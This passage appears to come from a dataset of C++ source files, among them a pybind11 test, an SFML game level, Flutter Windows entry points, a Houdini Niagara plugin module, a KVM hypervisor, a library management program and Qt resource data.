(char*)content;\n                        switch (j) {\n                            case 1: job.title = value; break;\n                            case 2: job.location = value; break;\n                            case 3: job.salary = value; break;\n                            case 4: job.datePosted = standardize_date(value); break;\n   ",
    "/*\n    tests/test_virtual_functions.cpp -- overriding virtual functions from Python\n\n    Copyright (c) 2016 Wenzel Jakob <wenzel.jakob@epfl.ch>\n\n    All rights reserved. Use of this source code is governed by a\n    BSD-style license that can be found in the LICENSE file.\n*/\n\n#include <pybind11/functional.h>\n\n#include \"constructor_stats.h\"\n#include \"pybind11_tests.h\"\n\n#include <thread>\n\n/* This is an example class that we'll want to be able to extend from Python */\nclass ExampleVirt {\npublic:\n    explicit ExampleVirt(int state) : state(state) { print_created(this, state); }\n    ExampleVirt(const ExampleVirt &e) : state(e.state) { print_copy_created(this); }\n    ExampleVirt(ExampleVirt &&e) noexcept : state(e.state) {\n        print_move_created(this);\n        e.state = 0;\n    }\n    virtual ~ExampleVirt() { print_destroyed(this); }\n\n    virtual int run(int value) {\n        py::print(\"Original implementation of \"\n                  \"ExampleVirt::run(state={}, value={}, str1={}, str2={})\"_s.format(\n                      state, value, get_string1(), *get_string2()));\n        return state + value;\n    }\n\n    virtual bool run_bool() = 0;\n    virtual void pure_virtual() = 0;\n\n    // Returning a reference/pointer to a type converted from python (numbers, strings, etc.) is a\n    // bit trickier, because the actual int& or std::string& or whatever only exists temporarily,\n    // so we have to handle it specially in the trampoline class (see below).\n    virtual const std::string &get_string1() { return str1; }\n    virtual const std::string *get_string2() { return &str2; }\n\nprivate:\n    int state;\n    const std::string str1{\"default1\"}, str2{\"default2\"};\n};\n\n/* This is a wrapper class that must be generated */\nclass PyExampleVirt : public ExampleVirt {\npublic:\n    using ExampleVirt::ExampleVirt; /* Inherit constructors */\n\n    int run(int value) override {\n        /* Generate wrapping code that enables native function overloading */\n        PYBIND11_OVERRIDE(int,         /* Return type */\n                          ExampleVirt, /* Parent class */\n                          run,         /* Name of function */\n                          value        /* Argument(s) */\n        );\n    }\n\n    bool run_bool() override {\n        PYBIND11_OVERRIDE_PURE(bool,        /* Return type */\n                               ExampleVirt, /* Parent class */\n                               run_bool,    /* Name of function */\n                                            /* This function has no arguments. The trailing comma\n                                               in the previous line is needed for some compilers */\n        );\n    }\n\n    void pure_virtual() override {\n        PYBIND11_OVERRIDE_PURE(void,         /* Return type */\n                               ExampleVirt,  /* Parent class */\n                               pure_virtual, /* Name of function */\n                                             /* This function has no arguments. The trailing comma\n                                                in the previous line is needed for some compilers */\n        );\n    }\n\n    // We can return reference types for compatibility with C++ virtual interfaces that do so, but\n    // note they have some significant limitations (see the documentation).\n    const std::string &get_string1() override {\n        PYBIND11_OVERRIDE(const std::string &, /* Return type */\n                          ExampleVirt,         /* Parent class */\n                          get_string1,         /* Name of function */\n                                               /* (no arguments) */\n        );\n    }\n\n    const std::string *get_string2() override {\n        PYBIND11_OVERRIDE(const std::string *, /* Return type */\n                          ExampleVirt,         /* Parent class */\n                          get_string2,         /* Name of function */\n                                               /* (no arguments) */\n        );\n    }\n};\n\nclass NonCopyable {\npublic:\n    NonCopyable(int a, int b) : value{new int(a * b)} { print_created(this, a, b); }\n    NonCopyable(NonCopyable &&o) noexcept : value{std::move(o.value)} { print_move_created(this); }\n    NonCopyable(const NonCopyable &) = delete;\n    NonCopyable() = delete;\n    void operator=(const NonCopyable &) = delete;\n    void operator=(NonCopyable &&) = delete;\n    std::string get_value() const {\n        if (value) {\n            return std::to_string(*value);\n        }\n        return \"(null)\";\n    }\n    ~NonCopyable() { print_destroyed(this); }\n\nprivate:\n    std::unique_ptr<int> value;\n};\n\n// This is like the above, but is both copy and movable.  In effect this means it should get moved\n// when it is not referenced elsewhere, but copied if it is still referenced.\nclass Movable {\npublic:\n    Movable(int a, int b) : value{a + b} { print_created(this, a, b); }\n    Movable(const Movable &m) : value{m.value} { print_copy_created(this); }\n    Movable(Movable &&m) noexcept : value{m.value} { print_move_created(this); }\n    std::strin",
    "#include \"header.h\"\nusing namespace std;\nusing namespace sf;\nlevel0::level0() : level(\"../../maps/map0.png\", \"../../a/base.png\"), up(true), fr(0)\n{\n    Image img;\n    img.loadFromFile(\"../../a/base.png\");\n    img.createMaskFromColor(Color(195, 195, 195));\n    tex.loadFromImage(img);\n    spr.setTexture(tex);\n    spr.setScale(2, 2);\n\n    font.loadFromFile(\"../../arial.ttf\");\n    text.setFont(font);\n    text.setCharacterSize(16);\n    text.setFillColor(Color::White);\n}\nvoid level0::restart()\n{\n    up = true;\n    fr = 0;\n}\nvoid level0::build_spec(double t, RenderWindow& window, double x, double y)\n{\n    double a = mapping.size() * slen / 2 + 30;\n    spr.setPosition(3 * slen, a + fr);\n    spr.setTextureRect(IntRect(192, 0, 33, 51));\n    window.draw(spr);\n\n    spr.setPosition(3 * slen + spr.getGlobalBounds().width / 2 + 3, a + spr.getGlobalBounds().height + 6 + fr);\n    spr.setTextureRect(IntRect(225, 0, 15, 33));\n    window.draw(spr);\n\n    text.setString(\"- jump\\n\\n- go left\\n\\n- go right\\n\\n- use lever/door\\n\\n- turn on/off music\");\n    text.setPosition(spr.getPosition().x + spr.getGlobalBounds().width + 7, a + 3 + fr);\n    window.draw(text);\n\n    if (up)\n        fr -= 0.015;\n    else\n        fr += 0.015;\n    if (abs(fr) >= 15)\n        up = !up;\n}\nvoid level0::trig_work(int trig, int i, int j, double& vx, double& vy)\n{\n    int n = mapping.size() - border, m = mapping[0].size() - 1;\n    switch (trig - trigger)\n    {\n    case 0:\n    {\n        delete_trig(trig, i, true);\n        y_view = false;\n        break;\n    }\n    case lever - trigger:\n    {\n        if (Keyboard::isKeyPressed(Keyboard::E))\n        {\n            mapping[n - 4][4] = door;\n            mapping[i][j] = lever_used;\n        }\n        break;\n    }\n    }\n}\n\nlevel1::level1() : level(\"../../maps/map1.png\", \"../../a/base.png\")\n{\n\n}\nvoid level1::restart()\n{\n    bl1.clear();\n    bl2.clear();\n}\nvoid level1::build_spec(double t, RenderWindow& window, double x, double y)\n{\n    start_fakes(t, window);\n}\nvoid level1::trig_work(int trig, int i, int j, double& vx, double& vy)\n{\n    int ki, kj, n = mapping.size() - border, m = mapping[0].size() - 1;\n    switch (trig - trigger)\n    {\n    case lever - trigger:\n    {\n        if (Keyboard::isKeyPressed(Keyboard::E))\n        {\n            mapping[i][j] = lever_used;\n            mapping[n - 6][j - 12] = door;\n            for (ki = i - 2; ki <= i; ki++)\n            {\n                mapping[ki][j - 7] = trigger + 5;\n                mapping[ki][j - 8] = invis;\n                mapping[ki + 3][j - 9] = fake_regular;\n            }\n        }\n        break;\n    }\n    case 0:\n    {\n        delete_trig(trig, j);\n        for (kj = character::start_j - 1; kj < character::start_j + 2; kj++)\n            mapping[character::start_i - 5][kj] = regular;\n        bl1.clear();\n        for (ki = n - 3; ki <= n - 2; ki++)\n        {\n            bl1.push_back(vector<fake_block>());\n            for (kj = j + 3; kj < j + 7; kj++)\n            {\n                bl1[ki - n + 3].push_back(fill_fb(kj * slen, ki * slen, 0, moving_fake, regular, kj - 8, ki, -0.6, 0));\n                mapping[ki][kj] = moving_fake;\n            }\n        }\n        break;\n    }\n    case 1:\n    {\n        delete_trig(trig, j);\n        bl2.clear();\n        for (ki = n - 3; ki <= n - 2; ki++)\n        {\n            bl2.push_back(vector<fake_block>());\n            for (kj = j; kj < j + 5; kj++)\n            {\n                bl2[ki - n + 3].push_back(fill_fb(kj * slen, ki * slen, 0, moving_fake2, regular, kj, ki + 4, 0, 0.3));\n                mapping[ki][kj] = moving_fake2;\n            }\n        }\n        break;\n    }\n    case 2:\n    {\n        delete_trig(trig, j);\n        bl1.clear();\n        bl2.clear();\n        for (ki = n - 3; ki <= n - 2; ki++)\n        {\n            bl1.push_back(vector<fake_block>());\n            bl2.push_back(vector<fake_block>());\n            for (kj = j + 1; kj <= j + 15; kj++)\n            {\n                if ((ki == n - 3) && ((kj - j - 1) % 5 > 1))\n                {\n                    bl1[ki - n + 3].push_back(fill_fb(kj * slen, ki * slen, 0, moving_fake, regular, kj, ki - 5 - 2 * ((kj - j - 1) / 5), 0, -0.5));\n                    mapping[ki][kj] = moving_fake;\n                }\n                else\n                {\n                    bl2[ki - n + 3].push_back(fill_fb(kj * slen, ki * slen, 0, moving_fake, regular, kj, ki + 4, 0, 0.5));\n                    mapping[ki][kj] = moving_fake;\n                }\n            }\n        }\n        break;\n    }\n    case 3:\n    {\n        mapping[i][j] = 0;\n        mapping[i + 1][j] = 0;\n        break;\n    }\n    case 4:\n    {\n        delete_trig(trig, j);\n        for (kj = j; kj <= j + 7; kj++)\n            mapping[n - 8][kj] = 0;\n        break;\n    }\n    case 5:\n    {\n        delete_trig(trig, j);\n        for (kj = m - 2; kj > m - 5; kj--)\n            mapping[n - 8][kj] = 0;\n        break;\n    }\n    case 6:\n    {\n        mapping[i][j] = spike_up;\n        break;\n    }\n    case 7:\n    {\n        delete_trig(trig, i, ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutterchatbot\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n* Copyright (c) <2018> Side Effects Software Inc.\n*\n* Permission is hereby granted, free of charge, to any person obtaining a copy\n* of this software and associated documentation files (the \"Software\"), to deal\n* in the Software without restriction, including without limitation the rights\n* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n* copies of the Software, and to permit persons to whom the Software is\n* furnished to do so, subject to the following conditions:\n*\n* The above copyright notice and this permission notice shall be included in all\n* copies or substantial portions of the Software.\n*\n* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n* SOFTWARE.\n*\n*/\n\n#include \"HoudiniNiagaraEditor.h\"\n#include \"HoudiniPointCacheAssetActions.h\"\n\n#include \"AssetRegistry/AssetRegistryModule.h\"\n#include \"Interfaces/IPluginManager.h\"\n#include \"Styling/SlateStyleRegistry.h\"\n#include \"Styling/SlateStyle.h\"\n\n#define LOCTEXT_NAMESPACE \"FHoudiniNiagaraModule\"\n\nvoid FHoudiniNiagaraEditorModule::StartupModule()\n{\n\t// Register the Houdini CSV Type Actions\n\tIAssetTools& AssetTools = FModuleManager::LoadModuleChecked< FAssetToolsModule >(\"AssetTools\").Get();\n\n\tTSharedRef< IAssetTypeActions > HCSVAction = MakeShareable( new FHoudiniPointCacheAssetActions() );\n\tAssetTools.RegisterAssetTypeActions( HCSVAction );\n\tAssetTypeActions.Add( HCSVAction );\n\n\t// Create Slate style set.\n\tif (!StyleSet.IsValid())\n\t{\n\t\t// Create Slate style set.\t\n\t\tStyleSet = MakeShareable(new FSlateStyleSet(TEXT(\"HoudiniNiagaraStyle\")));\n\t\tStyleSet->SetContentRoot(FPaths::EngineContentDir() / TEXT(\"Editor/Slate\"));\n\t\tStyleSet->SetCoreContentRoot(FPaths::EngineContentDir() / TEXT(\"Slate\"));\n\n\t\t// Note, these sizes are in Slate Units. Slate Units do NOT have to map to pixels.\n\t\tconst FVector2D Icon16x16(16.0f, 16.0f);\n\t\tconst FVector2D Icon64x64(64.0f, 64.0f);\n\t\tconst FVector2D Icon128x128(128.0f, 128.0f);\n\t\t\n\t\tstatic FString IconsDir = FPaths::EnginePluginsDir() / TEXT(\"FX/HoudiniNiagara/Resources/\");\n\t\tif (!FPaths::DirectoryExists(IconsDir))\n\t\t{\n\t\t\tIconsDir = IPluginManager::Get().FindPlugin(TEXT(\"HoudiniNiagara\"))->GetBaseDir() / TEXT(\"Resources/\");\n\t\t}\n\t\t\n\t\tif (FPaths::DirectoryExists(IconsDir) == false)\n\t\t\tIconsDir = FPaths::ProjectPluginsDir() / TEXT(\"HoudiniNiagara/Resources/\");\n\n\t\t// Register the Asset icon\n\t\tStyleSet->Set(\n\t\t\t\"ClassIcon.HoudiniPointCache\",\n\t\t\tnew FSlateImageBrush(IconsDir + TEXT(\"HCSVIcon128.png\"), Icon16x16));\n\n\t\tStyleSet->Set(\n\t\t\t\"ClassThumbnail.HoudiniPointCache\",\n\t\t\tnew FSlateImageBrush(IconsDir + TEXT(\"HCSVIcon128.png\"), Icon64x64));\n\n\t\t// Register Slate style.\n\t\tFSlateStyleRegistry::RegisterSlateStyle(*StyleSet.Get());\n\t}\n}\n\nvoid FHoudiniNiagaraEditorModule::ShutdownModule()\n{\n\t// Unregister asset type actions we have previously registered.\n\tif ( FModuleManager::Get().IsModuleLoaded(\"AssetTools\") )\n\t{\n\t\tIAssetTools & AssetTools = FModuleManager::GetModuleChecked< FAssetToolsModule >(\"AssetTools\").Get();\n\n\t\tfor ( int32 Index = 0; Index < AssetTypeActions.Num(); ++Index )\n\t\t\tAssetTools.UnregisterAssetTypeActions( AssetTypeActions[Index].ToSharedRef() );\n\n\t\tAssetTypeActions.Empty();\n\t}\n\n\t// Unregister Slate style set.\n\tif (StyleSet.IsValid())\n\t{\n\t\t// Unregister Slate style.\n\t\tFSlateStyleRegistry::UnRegisterSlateStyle(*StyleSet.Get());\n\n\t\tensure(StyleSet.IsUnique());\n\t\tStyleSet.Reset();\n\t}\n}\n\n#undef LOCTEXT_NAMESPACE\n\t\nIMPLEMENT_MODULE(FHoudiniNiagaraEditorModule, HoudiniNiagaraEditor)\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <cstring>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <sys/mman.h>\n#include <linux/kvm.h>\n#include <thread>\n#include <cstdio>\n#include <sstream>\n#include <string>\n#include <map>\n#include <semaphore.h>\n#include <queue>\n#include <utility>\n\nusing namespace std;\n\n#define PDE64_PRESENT 1\n#define PDE64_RW (1U << 1)\n#define PDE64_USER (1U << 2)\n#define PDE64_PS (1U << 7)\n\n#define CR4_PAE (1U << 5)\n#define CR0_PE 1u\n#define CR0_MP (1U << 1)\n#define CR0_ET (1U << 4)\n#define CR0_NE (1U << 5)\n#define CR0_WP (1U << 16)\n#define CR0_AM (1U << 18)\n#define CR0_PG (1U << 31)\n\n#define EFER_LME (1U << 8)\n#define EFER_LMA (1U << 10)\n\n#define CONSOLE_PORT 0xE9\n#define FILE_PORT 0x0278\n\n#define OPEN_FILE \"0\"\n#define CLOSE_FILE \"1\"\n#define READ_FILE \"2\"\n#define WRITE_FILE \"3\"\n\nsem_t mutex;\n\nstruct vm {\n    int kvm_fd;\n    int vm_fd;\n    int vcpu_fd;\n    char *mem;\n    struct kvm_run *kvm_run;\n    long mem_size;\n    long page_size;\n};\n\nstruct vmArgs {\n    string guestArg;\n    int memoryArg;\n    int pageArg;\n    vector<string> fileArgs;\n};\n\nint init_vm(struct vm *vm, long mem_size, long page_size) {\n    struct kvm_userspace_memory_region region;\n    int kvm_run_mmap_size;\n\n    vm->mem_size = mem_size;\n    vm->page_size = page_size;\n\n    vm->kvm_fd = open(\"/dev/kvm\", O_RDWR);\n    if(vm->kvm_fd < 0) {\n        perror(\"open /dev/kvm\");\n        return -1;\n    }\n\n    vm->vm_fd = ioctl(vm->kvm_fd, KVM_CREATE_VM, 0);\n    if(vm->vm_fd < 0) {\n        perror(\"KVM_CREATE_VM\");\n        return -1;\n    }\n\n    vm->mem = (char*)mmap(NULL, mem_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n    if(vm->mem == MAP_FAILED) {\n        perror(\"mmap mem\");\n        return -1;\n    }\n\n    region.slot = 0;\n\tregion.flags = 0;\n    region.guest_phys_addr = 0;\n    region.memory_size = mem_size;\n    region.userspace_addr = (unsigned long)vm->mem;\n    if(ioctl(vm->vm_fd, KVM_SET_USER_MEMORY_REGION, &region) < 0) {\n        perror(\"KVM_SET_USER_MEMORY_REGION\");\n        return -1;\n    }\n\n    vm->vcpu_fd = ioctl(vm->vm_fd, KVM_CREATE_VCPU, 0);\n    if(vm->vcpu_fd < 0) {\n        perror(\"KVM_CREATE_VCPU\");\n        return -1;\n    }\n\n    kvm_run_mmap_size = ioctl(vm->kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);\n    if(kvm_run_mmap_size <= 0) {\n        perror(\"KVM_GET_VCPU_MMAP_SIZE\");\n        return -1;\n    }\n\n    vm->kvm_run = (struct kvm_run*)mmap(NULL, kvm_run_mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vm->vcpu_fd, 0);\n    if(vm->kvm_run == MAP_FAILED) {\n        perror(\"mmap kvm_run\");\n        return -1;\n    }\n\n    return 0;\n}\n\nstatic void setup_64bit_code_segment(struct kvm_sregs *sregs) {\n    struct kvm_segment seg = {\n        0,              // base\n        0xffffffff,     // limit\n        0,              // selector\n        11,             // type\n        1,              // present\n        0,              // dpl\n        0,              // db\n        1,              // s\n        1,              // l\n        1,              // g\n        0,              // avl\n        0,              // unusable\n        0,              // padding\n    };\n\n    sregs->cs = seg;\n\n    seg.type = 3;\n    sregs->ds = sregs->es = sregs->fs = sregs->gs = sregs->ss = seg;\n}\n\nstatic void setup_long_mode(struct vm *vm, struct kvm_sregs *sregs) {\n    long mem_size = vm->mem_size;\n    long page_size = vm->page_size;\n\n    uint64_t page = 0;\n    uint64_t pml4_addr = 0x1000;\n    uint64_t *pml4 = (uint64_t*)(vm->mem + pml4_addr);\n\n    uint64_t pdpt_addr = 0x2000;\n    uint64_t *pdpt = (uint64_t*)(vm->mem + pdpt_addr);\n\n    uint64_t pd_addr = 0x3000;\n    uint64_t *pd = (uint64_t*)(vm->mem + pd_addr);\n\n    uint64_t pt_addr = 0x4000;\n    uint64_t *pt = (uint64_t*)(vm->mem + pt_addr);\n\n    pml4[0] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pdpt_addr;\n    pdpt[0] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pd_addr;\n\n    if(page_size == 2 * 1024 * 1024) {\n        uint64_t num_entries = mem_size / (2 * 1024 * 1024);\n        for (int i = 0; i < num_entries && i < 4; i++) {\n            pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_USER | PDE64_PS | page;\n            page += 2 << 20;\n        }\n    } else if(page_size == 4 * 1024) {\n        uint64_t number_of_2mbs = mem_size / (2 * 1024 * 1024);\n        for(uint64_t i = 0; i < number_of_2mbs; i++) {\n            pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pt_addr;\n            for(int j = 0; j < 512; j++) {\n                pt[j] = page | PDE64_PRESENT | PDE64_RW | PDE64_USER;\n                page += 0x1000;\n\t\t    }\n            pt_addr += 0x1000;\n        }\n    }\n\n    sregs->cr3 = pml4_addr;\n    sregs->cr4 = CR4_PAE;\n    sregs->cr0 = CR0_PE | CR0_PG;\n    sregs->efer = EFER_LME | EFER_LMA;\n\n    setup_64bit_code_segment(sregs);\n}\n\nvector<string> split(const string& str, char delimiter) {\n    vector<string> tokens;\n    string token;\n    istringstream tokenStream(str);\n    \n    while(getline(tokenStream, token, delimiter)) {\n        tokens.push_back(token);\n    }\n    \n    ret",
    "#include <iostream>\r\n#include <fstream>\r\n#include <iomanip>\r\n#include <cstring>\r\n#include <cstdlib>\r\n#include <limits>\r\n#include <cstdio>\r\n#include <windows.h> // Include for Windows API functions\r\nusing namespace std;\r\n\r\nvoid clrscr() {\r\n    system(\"cls\");\r\n}\r\n\r\nvoid gotoxy(int x, int y) {\r\n    COORD coord;\r\n    coord.X = x;\r\n    coord.Y = y;\r\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n}\r\n\r\nclass book {\r\n    char bno[6];\r\n    char bname[50];\r\n    char aname[20];\r\n\r\npublic:\r\n    void createbook() {\r\n        cout << \"\\nNEW BOOK ENTRY...\\n\";\r\n        cout << \"\\nEnter The Book No.: \";\r\n        cin >> bno;\r\n        cin.ignore(); // to clear the '\\n' left by cin\r\n        cout << \"\\nEnter The Book Name: \";\r\n        cin.getline(bname, 50);\r\n        cout << \"\\nEnter The Author's Name: \";\r\n        cin.getline(aname, 20);\r\n        cout << \"\\n\\n\\nBOOK CREATED..\";\r\n    }\r\n\r\n    void showbook() {\r\n        cout << \"\\nBOOK NUMBER : \" << bno;\r\n        cout << \"\\nBOOK NAME : \" << bname;\r\n        cout << \"\\nAUTHOR NAME : \" << aname;\r\n    }\r\n\r\n    void modifybook() {\r\n        cout << \"\\nBOOK NUMBER : \" << bno;\r\n        cout << \"\\nMODIFY BOOK NAME : \";\r\n        cin.ignore(); // to clear the '\\n' left by cin\r\n        cin.getline(bname, 50);\r\n        cout << \"\\nMODIFY AUTHOR's NAME : \";\r\n        cin.getline(aname, 20);\r\n    }\r\n\r\n    char* retbno() {\r\n        return bno;\r\n    }\r\n\r\n    void report() {\r\n        cout << bno << setw(30) << bname << setw(30) << aname << endl;\r\n    }\r\n};\r\n\r\nclass student {\r\n    char admno[6];\r\n    char name[100];\r\n    char stbno[6];\r\n    int token;\r\n\r\npublic:\r\n    void createstudent() {\r\n        clrscr();\r\n        cout << \"\\nNEW STUDENT ENTRY...\\n\";\r\n        cout << \"\\nEnter The Admission No. : \";\r\n        cin >> admno;\r\n        cin.ignore(); // to clear the '\\n' left by cin\r\n        cout << \"\\nEnter The Student Name : \";\r\n        cin.getline(name, 100);\r\n        token = 0;\r\n        stbno[0] = '\\0';\r\n        cout << \"\\n\\nStudent Record Created.. \";\r\n    }\r\n\r\n    void showstudent() {\r\n        cout << \"\\nAdmission Number : \" << admno;\r\n        cout << \"\\nStudent Name : \" << name;\r\n        cout << \"\\nNo of Books issued : \" << token;\r\n        if (token == 1) {\r\n            cout << \"\\nBook Number \" << stbno;\r\n        }\r\n    }\r\n\r\n    void modifystudent() {\r\n        cout << \"\\nAdmission No. : \" << admno;\r\n        cout << \"\\nModify Student Name : \";\r\n        cin.ignore(); // to clear the '\\n' left by cin\r\n        cin.getline(name, 100);\r\n    }\r\n\r\n    char* retadmno() {\r\n        return admno;\r\n    }\r\n\r\n    char* retstbno() {\r\n        return stbno;\r\n    }\r\n\r\n    int rettoken() {\r\n        return token;\r\n    }\r\n\r\n    void addtoken() {\r\n        token = 1;\r\n    }\r\n\r\n    void resettoken() {\r\n        token = 0;\r\n    }\r\n\r\n    void getstbno(char t[]) {\r\n        strcpy(stbno, t);\r\n    }\r\n\r\n    void report() {\r\n        cout << \"\\t\" << admno << setw(20) << name << setw(10) << token << endl;\r\n    }\r\n};\r\n\r\nfstream fp, fp1;\r\nbook bk;\r\nstudent st;\r\n\r\nvoid writebook() {\r\n    char ch;\r\n    fp.open(\"book.dat\", ios::out | ios::app);\r\n    do {\r\n        clrscr();\r\n        bk.createbook();\r\n        fp.write((char*)&bk, sizeof(book));\r\n        cout << \"\\n\\nDo you want to add more record..(y/n)? \";\r\n        cin >> ch;\r\n        cin.ignore(); // to clear the '\\n' left by cin\r\n    } while (ch == 'y' || ch == 'Y');\r\n    fp.close();\r\n}\r\n\r\nvoid writestudent() {\r\n    char ch;\r\n    fp.open(\"student.dat\", ios::out | ios::app);\r\n    do {\r\n        clrscr();\r\n        st.createstudent();\r\n        fp.write((char*)&st, sizeof(student));\r\n        cout << \"\\n\\nDo you want to add more record..(y/n)? \";\r\n        cin >> ch;\r\n        cin.ignore(); // to clear the '\\n' left by cin\r\n    } while (ch == 'y' || ch == 'Y');\r\n    fp.close();\r\n}\r\n\r\nvoid displayspecificbook(char n[]) {\r\n    cout << \"\\nBOOK DETAILS\\n\";\r\n    int flag = 0;\r\n    fp.open(\"book.dat\", ios::in);\r\n    while (fp.read((char*)&bk, sizeof(book))) {\r\n        if (strcmp(bk.retbno(), n) == 0) {\r\n            bk.showbook();\r\n            flag = 1;\r\n        }\r\n    }\r\n    fp.close();\r\n    if (flag == 0) {\r\n        cout << \"\\n\\nBook Doesn't Exist\";\r\n    }\r\n    cin.get(); // Pause to let user see the message\r\n}\r\n\r\nvoid displayspecificstudent(char n[]) {\r\n    cout << \"\\nSTUDENT DETAILS\\n\";\r\n    int flag = 0;\r\n    fp.open(\"student.dat\", ios::in);\r\n    while (fp.read((char*)&st, sizeof(student))) {\r\n        if (strcmp(st.retadmno(), n) == 0) {\r\n            st.showstudent();\r\n            flag = 1;\r\n        }\r\n    }\r\n    fp.close();\r\n    if (flag == 0) {\r\n        cout << \"\\n\\nStudent Doesn't Exist\";\r\n    }\r\n    cin.get(); // Pause to let user see the message\r\n}\r\n\r\nvoid modifybook() {\r\n    char n[6];\r\n    int found = 0;\r\n    clrscr();\r\n    cout << \"\\n\\nMODIFY BOOK RECORD...\";\r\n    cout << \"\\n\\nEnter The Book No. : \";\r\n    cin >> n;\r\n    fp.open(\"book.dat\", ios::in | ios::out);\r\n    while (fp.read((char*)&bk, sizeof(book)) && found == 0) {\r\n        if (strcmp(bk.retbno(), n) == 0) {\r",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/****************************************************************************\n** Resource object code\n**\n** Created by: The Resource Compiler for Qt version 6.8.0\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#ifdef _MSC_VER\n// disable informational message \"function ... selected for automatic inline expansion\"\n#pragma warning (disable: 4711)\n#endif\n\nstatic const unsigned char qt_resource_data[] = {\n  // redo.png\n  0x0,0x0,0x3a,0xe0,\n  0x89,\n  0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,\n  0x0,0x2,0x0,0x0,0x0,0x2,0x0,0x8,0x6,0x0,0x0,0x0,0xf4,0x78,0xd4,0xfa,\n  0x0,0x0,0x0,0x9,0x70,0x48,0x59,0x73,0x0,0x0,0xe,0xc3,0x0,0x0,0xe,0xc3,\n  0x1,0xc7,0x6f,0xa8,0x64,0x0,0x0,0x0,0x19,0x74,0x45,0x58,0x74,0x53,0x6f,0x66,\n  0x74,0x77,0x61,0x72,0x65,0x0,0x77,0x77,0x77,0x2e,0x69,0x6e,0x6b,0x73,0x63,0x61,\n  0x70,0x65,0x2e,0x6f,0x72,0x67,0x9b,0xee,0x3c,0x1a,0x0,0x0,0x20,0x0,0x49,0x44,\n  0x41,0x54,0x78,0x9c,0xed,0xdd,0x79,0x7c,0x5d,0x5,0x9d,0xff,0xff,0xf7,0xe7,0xdc,\n  0xa4,0x5b,0xa,0x8,0x88,0x80,0xb,0xe0,0x82,0x1b,0xa2,0x7c,0xa5,0x22,0xb4,0xb9,\n  0x69,0x23,0x4b,0x9b,0xb4,0x65,0x51,0x5b,0x6,0x47,0x51,0x41,0x65,0x46,0x46,0x84,\n  0x36,0x49,0x11,0x67,0xf4,0xea,0xfc,0x44,0xda,0x84,0x82,0x8c,0x1b,0xca,0xb8,0xe1,\n  0x4a,0x5d,0xb0,0x25,0x49,0xa9,0x68,0x97,0xb4,0x5,0x84,0xba,0xe3,0x3a,0xae,0x28,\n  0x8b,0xa0,0x2c,0x25,0x69,0x9b,0xdc,0x7b,0x3e,0xbf,0x3f,0xca,0x8c,0x28,0x94,0x6e,\n  